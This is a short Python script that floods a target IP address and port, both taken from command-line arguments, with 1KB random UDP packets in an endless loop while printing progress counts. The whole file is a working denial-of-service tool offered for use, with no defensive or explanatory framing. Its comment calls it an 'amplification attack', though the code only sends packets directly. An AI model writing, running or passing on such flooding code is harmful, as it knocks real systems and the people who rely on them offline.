import socket
import random
import sys

target_ip = sys.argv[1]
target_port = int(sys.argv[2])

def attack(target_ip, target_port):
    try:
        # A simplified amplification attack
        # We will send a large number of UDP packets
        print(f"[*] Starting attack on {target_ip}:{target_port}")
        bytes_to_send = random._urandom(1024) # 1KB packet
        sent = 0
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(bytes_to_send, (target_ip, target_port))
                sent += 1
                s.close()
                if sent % 1000 == 0:
                    print(f"[*] Sent {sent} packets to {target_ip}:{target_port}")
            except Exception as e:
                print(f"[!] Error: {e}")
                break
    except KeyboardInterrupt:
        print("\n[+] Attack stopped by user.")

if __name__ == "__main__":
    attack(target_ip, target_port)
